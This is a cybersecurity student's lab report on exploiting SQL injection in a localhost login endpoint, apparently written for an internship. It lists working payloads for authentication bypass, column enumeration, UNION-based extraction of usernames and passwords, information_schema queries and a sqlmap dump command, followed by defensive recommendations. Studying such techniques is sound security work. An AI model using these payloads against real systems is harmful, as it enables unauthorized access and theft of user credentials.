# FUTURE_CS_01
🔐 Web Application Security Assessment – SQL Injection Exploitation
Date:
July 7, 2025
 Conducted by:
Safik Rahman 
Cybersecurity Student

1. Introduction
This project demonstrates a real-world simulation of a SQL Injection vulnerability discovered and exploited in a sample web application. The test was conducted in a secure lab environment as part of a cybersecurity internship task. Other potential flaws like XSS and authentication issues were also explored.

2. Objective
The objective was to evaluate the security posture of the application by simulating penetration testing techniques.
The goal was to:

Identify SQL Injection vulnerabilities

Extract sensitive data

Maintain system integrity during testing

3. Tools & Environment

Operating System: Kali Linux

Manual Tools: Web Browser, Custom SQL Payloads

Automated Tool: sqlmap

Target Application: Localhost-hosted web application

4. Vulnerability Identified: SQL Injection

4.1 Entry Point

HTTP Method: POST

URL Endpoint: /rest/user/login

Vulnerable Parameters: email, password

4.2 Initial Payload Used
' OR '1'='1' --
This payload bypassed authentication by manipulating the SQL query logic and allowed login without valid credentials.

5. Exploitation Process

Step 1: Column Enumeration
Tested with:

' ORDER BY 1 --

' ORDER BY 2 --
These helped determine the number of columns used in the SQL query.

Step 2: Union Injection Confirmation
Payload: ' UNION SELECT 'test', 'output' --
This verified which columns could reflect data back to the user.

Step 3: Data Extraction
Payload: ' UNION SELECT username, password FROM users --
This allowed sensitive user data to be retrieved from the users table.

Step 4: Information Schema Usage (in case table/column names were unknown):

' UNION SELECT table_name, null FROM information_schema.tables --

' UNION SELECT column_name, null FROM information_schema.columns WHERE table_name='users' --

Step 5: sqlmap Automation
Command used:
sqlmap -u "http://localhost:3000/rest/user/login" --data="email=test&password=test" --dump --batch
sqlmap automated the detection and extraction of database entries.

6. Recommendations
To prevent SQL Injection vulnerabilities in the future:

Use Parameterized Queries instead of dynamically building SQL with user input

Apply Input Validation and use allowlists for all inputs

Use ORM frameworks to abstract raw SQL

Add a Web Application Firewall (WAF) to monitor and block malicious input

Use Least Privilege Principle for database access

7. Conclusion
This assessment successfully demonstrated the presence of a high-impact SQL Injection vulnerability within the login module of a web application. Exploitation led to unauthorized access and data exposure. All activities were performed ethically in a controlled lab environment to raise awareness of secure coding practices.

Report by:
Safik Rahman 
Date: July 7, 2025
